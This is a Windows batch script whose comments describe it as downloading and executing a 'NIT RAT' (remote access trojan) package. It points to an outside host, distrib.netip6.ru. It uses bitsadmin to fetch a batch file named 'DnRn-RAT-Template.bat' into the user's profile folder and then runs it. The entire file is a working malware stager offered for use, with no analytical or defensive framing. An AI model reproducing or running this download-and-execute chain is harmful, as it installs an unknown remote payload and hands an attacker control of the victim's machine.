@echo on
rem *******************************************************
rem nit-RAT-Template-run-00.cmd
rem This Script will Download and Execute the NIT RAT 
rem Packet with Command Line
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=RAT
set REDACT=
set FIRM=NIT
set PRODUCT_FOLDER_REMOTE=%FIRM%/%PRODUCT_NAME%/

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set Working Directory (may be Changed)
rem
set WorkingDir=%UserProfile%

rem Set Host
rem
set aPrefix=http
set aDomain=distrib.netip6.ru
set aPort=80
set aRemoteDir=/%PRODUCT_FOLDER_REMOTE%

set host=%aPrefix%://%aDomain%:%aPort%%aRemoteDir%

rem Set a File
rem
set aFile=DnRn-RAT-Template.bat

echo Download and Run Payload..
rem
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND ^
%host%%aFile% %WorkingDir%\%aFile%

bitsadmin.exe /reset


rem Run Payloads
rem

call %WorkingDir%\%aFile%

echo The End of the Script %0
exit /b 0
